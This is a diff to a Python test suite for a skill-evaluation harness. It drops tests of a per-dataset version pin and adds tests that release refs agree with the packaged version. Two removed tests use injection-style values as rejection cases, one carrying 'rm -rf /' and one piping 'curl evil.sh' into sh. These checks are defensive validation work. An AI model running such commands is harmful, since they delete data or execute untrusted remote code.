@@ -14,6 +14,10 @@ quietly drifted from what the runner enforces is worse than no schema at all.
 Third, hold the harness to being repo-agnostic, which is the whole reason it
 lives in its own repo: every test that needs a repo builds a throwaway one in a
 temp directory rather than reading whatever happens to be checked out here.
+
+`TestTheReleaseRefsAgree` is the one exception to that last rule, and reads this
+checkout on purpose: what it checks is a fact about this repository's own
+release, which no throwaway repo could have.
 """
 
 from __future__ import annotations
@@ -23,6 +27,7 @@ import contextlib
 import io
 import json
 import os
+import re
 import tempfile
 import time
 import unittest
@@ -30,6 +35,7 @@ import urllib.error
 from pathlib import Path
 from unittest import mock
 
+import skillscope
 from skillscope import (
     agent,
     behavior,
@@ -42,13 +48,13 @@ from skillscope import (
     structure,
 )
 from skillscope import select as select_module
-from skillscope.datasets import EVALUATIONS_KEY, TRIGGER_KEY, VERSION_KEY
+from skillscope.datasets import EVALUATIONS_KEY, TRIGGER_KEY
 
 SCHEMA_DIR = datasets.PACKAGE_DIR / "schema"
 TRIGGERING = "triggeringEvaluation"
 NON_TRIGGERING = "nonTriggeringEvaluation"
 
-BOOTSTRAP = Path(__file__).resolve().parent.parent / "bootstrap" / "resolve_version.py"
+REPO_ROOT = Path(__file__).resolve().parent.parent
 
 
 def parse(
@@ -181,11 +187,6 @@ class TestSchemaStaysInSyncWithParser(unittest.TestCase):
 
     def test_top_level_properties_match_parser(self) -> None:
         self.assertEqual(set(self.schema["properties"]), datasets.DATASET_KEYS)
-
-    def test_the_harness_version_pin_is_documented(self) -> None:
-        # It is the one field that changes which code grades a dataset, so an
-        # undocumented one would be invisible to the owners who set it.
-        self.assertIn(VERSION_KEY, self.schema["properties"])
 
     def test_triggering_properties_match_parser(self) -> None:
         self.assertEqual(
@@ -445,12 +446,6 @@ class TestConfig(unittest.TestCase):
                 ("skills/*",),
             )
 
-    def test_the_version_comes_from_the_environment_when_unset(self) -> None:
-        repo = Repo(self)
-        with mock.patch.dict(os.environ, {config.VERSION_ENV: "v9.9.9"}):
-            self.assertEqual(config.build(repo.root).version, "v9.9.9")
-            self.assertEqual(config.build(repo.root, version="").version, "")
-
 
 class TestRoutingSet(unittest.TestCase):
     """Who a skill competes against is listed, never inferred."""
@@ -695,114 +690,59 @@ class TestDeadline(unittest.TestCase):
         self.assertIn("behavioral exceeded --timeout", outcome.error)
 
 
-class TestHarnessVersionPin(unittest.TestCase):
-    """Which build of the harness grades a dataset is data, in a reviewable diff."""
+class TestTheReleaseRefsAgree(unittest.TestCase):
+    """A caller who pins a tag gets that tag's harness, or these fail.
 
-    def setUp(self) -> None:
-        self.repo = Repo(self)
-        self.repo.skill("pinned-skill", dataset=tier0_dataset("pinned", skillscope_version="v1.2.0"))
-        self.repo.skill("unpinned-skill", dataset=tier0_dataset("unpinned"))
-        self.repo.activate(version="v1.0.0")
+    `uses: amd/skillscope@vX.Y.Z` is the whole of the version story: Actions
+    downloads this repository at that ref to run the action, and the action
+    installs the harness out of the checkout it lands in. So there is nothing to
+    resolve and nothing that can disagree -- as long as the ref is right.
 
-    def test_a_dataset_pin_wins_for_that_skill(self) -> None:
-        self.assertEqual(datasets.pinned_version("pinned-skill"), "v1.2.0")
+    A step's `uses:` cannot be an expression, so that ref is a literal in every
+    workflow and every example here, and a literal left behind at release time
+    is a caller quietly graded by a harness they did not ask for. Nothing about
+    a run would look wrong. These tests are what makes it impossible: the
+    version, the refs, and the packaging metadata are bumped together or the
+    suite says which one was missed.
+    """
 
-    def test_an_unpinned_skill_falls_back_to_the_running_version(self) -> None:
-        self.assertEqual(datasets.pinned_version("unpinned-skill"), "v1.0.0")
+    # Files a caller reads or calls, so the ref in each is a promise about which
+    # harness they get. Prose that merely mentions a ref does not match: the
+    # pattern wants the `uses:` that actually resolves one.
+    SOURCES = (".github/workflows/*.yml", "examples/*.yml", "README.md", "docs/*.md")
+    REF = re.compile(r"uses:\s*amd/skillscope(?:/\S+?)?@(\S+)")
 
-    def test_routing_uses_the_running_version(self) -> None:
-        # Routing installs several skills in one session, so it cannot honor
-        # several per-skill pins at once.
-        self.assertEqual(datasets.pinned_version(), "v1.0.0")
+    def refs(self) -> dict[str, list[str]]:
+        found: dict[str, list[str]] = {}
+        for pattern in self.SOURCES:
+            for path in sorted(REPO_ROOT.glob(pattern)):
+                matches = self.REF.findall(path.read_text(encoding="utf-8"))
+                if matches:
+                    found[path.relative_to(REPO_ROOT).as_posix()] = matches
+        return found
 
-    def test_the_pin_is_not_mistaken_for_an_evaluation_key(self) -> None:
-        cases, errors = parse(tier0_dataset("demo", skillscope_version="main"))
-        self.assertEqual(errors, [])
-        self.assertEqual(len(cases), 5)
-
-    def test_a_pin_that_is_not_a_git_ref_is_rejected(self) -> None:
-        _, errors = parse(tier0_dataset("demo", skillscope_version="v1 or so; rm -rf /"))
-        self.assertTrue(any(VERSION_KEY in e for e in errors), errors)
-
-    def test_a_non_string_pin_is_rejected(self) -> None:
-        _, errors = parse(tier0_dataset("demo", skillscope_version=1.2))
-        self.assertTrue(any(VERSION_KEY in e for e in errors), errors)
-
-    def test_select_emits_the_version_per_leg(self) -> None:
-        self.repo.skill(
-            "behaving-skill",
-            dataset=tier0_dataset(
-                "behaving",
-                skillscope_version="v3.0.0",
-            )
-            | {
-                EVALUATIONS_KEY: tier0_dataset("behaving")[EVALUATIONS_KEY]
-                + [
-                    {
-                        "id": "behaving-graded",
-                        TRIGGER_KEY: True,
-                        "prompt": "do the thing",
-                        "logs_contain": ["thing.py"],
-                    }
-                ]
-            },
+    def test_the_packaged_version_matches_the_module(self) -> None:
+        declared = re.search(
+            r'(?m)^version\s*=\s*"([^"]+)"',
+            (REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8"),
         )
-        plan = select_module.plan(["behaving-skill"], routing=True, labels=set())
-        self.assertEqual(plan["version"], "v1.0.0")
-        self.assertEqual([leg["version"] for leg in plan["default"]], ["v3.0.0"])
+        self.assertIsNotNone(declared, "pyproject.toml declares no version")
+        self.assertEqual(declared.group(1), skillscope.__version__)
 
+    def test_every_reference_names_this_version(self) -> None:
+        expected = f"v{skillscope.__version__}"
+        for where, refs in self.refs().items():
+            for ref in refs:
+                with self.subTest(where=where, ref=ref):
+                    self.assertEqual(ref, expected)
 
-class TestBootstrapResolver(unittest.TestCase):
-    """The launcher reads the pin without importing the harness it launches."""
-
-    def setUp(self) -> None:
-        import importlib.util
-
-        spec = importlib.util.spec_from_file_location("resolve_version", BOOTSTRAP)
-        self.module = importlib.util.module_from_spec(spec)
-        spec.loader.exec_module(self.module)
-        self.repo = Repo(self)
-        self.repo.skill("demo-skill", dataset=tier0_dataset("demo", skillscope_version="v2.0.0"))
-
-    def resolve(self, **kwargs) -> str:
-        return self.module.resolve(root=self.repo.root, **kwargs)
-
-    def test_an_explicit_version_wins(self) -> None:
-        self.assertEqual(self.resolve(requested="v9", env="v8", skill="demo-skill"), "v9")
-
-    def test_the_environment_comes_next(self) -> None:
-        self.assertEqual(self.resolve(requested="", env="v8", skill="demo-skill"), "v8")
-
-    def test_then_the_skill_that_is_being_run(self) -> None:
-        self.assertEqual(self.resolve(requested="", env="", skill="demo-skill"), "v2.0.0")
-
-    def test_a_repo_that_pins_nothing_falls_back_to_the_launcher_ref(self) -> None:
-        empty = Repo(self)
-        self.assertEqual(
-            self.module.resolve(root=empty.root, requested="", env="", skill="", default="bootstrap"),
-            "bootstrap",
-        )
-
-    def test_with_no_pin_and_no_default_it_says_so(self) -> None:
-        empty = Repo(self)
-        with self.assertRaises(SystemExit) as caught:
-            self.module.resolve(root=empty.root, requested="", env="", skill="", default="")
-        self.assertIn("version", str(caught.exception))
-
-    def test_it_finds_a_skill_under_the_globs_it_is_given(self) -> None:
-        repo = Repo(self)
-        repo.skill("odd-place", dataset=tier0_dataset("odd", skillscope_version="v4"), where="agents")
-        self.assertEqual(
-            self.module.resolve(
-                root=repo.root, requested="", env="", skill="odd-place", globs=["agents/*"]
-            ),
-            "v4",
-        )
-
-    def test_a_ref_that_could_be_a_shell_injection_is_refused(self) -> None:
-        # The result is interpolated into a `uvx --from git+...@REF` command.
-        with self.assertRaises(SystemExit):
-            self.resolve(requested="v1; curl evil.sh | sh", env="", skill="")
+    def test_the_workflows_a_caller_pins_do_reference_it(self) -> None:
+        # Without this, deleting every reference would pass the test above by
+        # having nothing left to disagree with.
+        found = self.refs()
+        for name in ("reusable.yml", "skill-evals.yml"):
+            with self.subTest(name):
+                self.assertIn(f".github/workflows/{name}", found)
 
 
 class TestSelection(unittest.TestCase):
@@ -847,7 +787,7 @@ class TestSelection(unittest.TestCase):
         )
 
     def test_an_infra_path_selects_everything(self) -> None:
-        # The workflow holds the routing set and the version pin, so a change
+        # The workflow holds the routing set and the harness ref, so a change
         # to it can move any result.
         self.assertEqual(
             select_module.select_from_changes({".github/workflows/evals.yml"}),
